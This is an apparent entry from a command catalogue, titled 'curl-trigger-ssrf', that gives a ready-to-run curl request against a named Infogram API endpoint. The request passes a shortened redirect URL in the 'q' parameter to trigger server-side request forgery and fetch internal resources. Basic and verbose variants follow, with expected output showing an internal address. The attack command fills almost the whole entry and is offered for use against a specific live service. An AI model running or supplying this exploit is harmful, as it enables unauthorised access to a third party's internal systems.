---
id: cmd-uuid-2
data: >-
  curl
  "https://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg"
tags:
  - ssrf
  - http
  - exploit
type: command
output: '{"status":"success","data":"internal resource metadata"}'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:18.646Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-ssrf

## Command

```bash
curl "https://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg"
```

## Description

Sends a GET request to the Infogram API with a redirect URL in the 'q' parameter to trigger SSRF and fetch internal resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full API endpoint with query | Yes |
| `q` | The redirect URL parameter | Yes |

## Examples

### Basic Usage

```bash
curl "https://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg"
```

### Advanced Usage

```bash
curl -v "https://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg"  # Verbose output
```

## Expected Output

JSON response with internal resource details, e.g., {"url":"http://0:6000/","status":"fetched"}.

## Related

- [[commands/curl-verify-redirect]]
